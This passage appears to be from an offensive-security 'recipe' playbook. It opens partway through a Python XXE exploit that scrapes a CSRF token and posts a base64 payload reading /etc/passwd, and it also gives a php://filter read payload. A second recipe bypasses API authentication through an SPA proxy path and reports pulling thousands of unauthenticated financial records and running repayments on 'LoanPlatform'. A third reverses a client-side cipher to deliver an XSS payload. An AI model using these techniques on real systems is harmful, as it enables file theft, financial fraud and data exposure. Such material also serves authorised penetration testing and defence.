r = s.get('https://target/endpoint')
token = re.search(r'value="([A-Za-z0-9_/+=-]{50,})"', r.text).group(1)
xxe = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
data = base64.b64encode(xxe.encode()).decode()
r2 = s.post('https://target/endpoint', data={'param': data, 'token': token})
print(r2.text)
```

**Key notes:**
- CSRF token is single-use and session-bound — must GET+POST in same session
- Also test: `php://filter/convert.base64-encode/resource=/etc/passwd` for binary-safe reads
- SecOps June 2026: Contact Us iframe sent country as `btoa(xml)`, file content returned in `<address>` field

**EXPECTED YIELD:** Arbitrary file read, SSRF, DoS via billion laughs (High/Critical)

---

## RECIPE: SPA Proxy Path Prefix Bypass (LoanPlatform JFS, June 2026)

**TRIGGER:** Target has SPA at path prefix (e.g., `/app/client/`) + separate API service at another prefix (e.g., `/app/service/`). API service returns 400/401 for direct access. Istio/Envoy mesh routing.

**TECHNIQUE:**
1. Find SPA base path and JS config (source maps, meta tags, webpack config)
2. Identify relative API URL patterns: `API_LOAN: {BASE_URL: 'loan/v1'}`, `API_JFS: {BASE_URL: 'jfs'}`
3. Call API via SPA prefix: `GET /{spa-path}/{api-base}/{endpoint}` instead of `GET /{service-path}/{endpoint}`
4. If GET works unauth → test POST for write actions (financial operations!)

**WHY IT WORKS:** SPA proxy (nginx/Istio) forwards AJAX calls to backend without enforcing auth. Proxy trusts client-side token handling. Direct service path has Istio routing rules rejecting requests missing auth headers.

**DISCOVERY CLUES:**
- Service returns 400 "Bad Request" (11 bytes, text/plain from Envoy) — NOT 401/403
- SPA `<meta name=base_url content="">` = relative paths
- Source maps reveal URL config objects

**YIELD:** LoanPlatform (June 2026): `/app-jfs/loan-service/` → 400 blocked. `/app-jfs/jfs-client/jfs/` → 200 unauth. Result: 5,327 financial records, repayment execution (Critical), PGP key gen (High), 115-field PII IDOR, 13 business partners.

---

## RECIPE: DOM XSS via Client-Side Cipher + innerHTML Sink

**TRIGGER:** App uses `innerHTML` to render input AFTER a client-side transformation (cipher, encoding). If transformation preserves `<>()=;` while scrambling alphanumerics, XSS is achievable.
**TECHNIQUE:**
1. Find `innerHTML` assignments in JS source
2. Trace data flow — identify transformation function between input and sink
3. Analyze: does it preserve HTML metacharacters `<>()=;/"'`?
4. Reverse-engineer the cipher to find input that produces valid HTML:
```python
# Given substitution cipher extracted from JS
input_chars  = 'ABCDE...<>;'
output_chars = '98765...imj'
def decode(target):
    return ''.join(input_chars[output_chars.find(c)] if output_chars.find(c)>-1 else c for c in target)
target = '<img src=x onerror=alert(1)>'
payload = decode(target)  # Type THIS in the input field
```
5. Verify: run encode(payload) in browser console — must produce exact target HTML

**Key notes:**
- Server-side may HTML-encode the `value` attribute — attack requires typing directly in browser (true DOM-based)
- SecOps June 2026: xss4 cipher mapped `<` to `i`, `>` to `j` — input `K<;8 ut4=z qp6ttqt=2)6tvMINL` produced `<img src=x onerror=alert(1)>` after encode()
- General approach: extract encode(), build reverse map, reverse-map your desired XSS payload

**EXPECTED YIELD:** DOM XSS, bypasses server-side encoding (Medium)
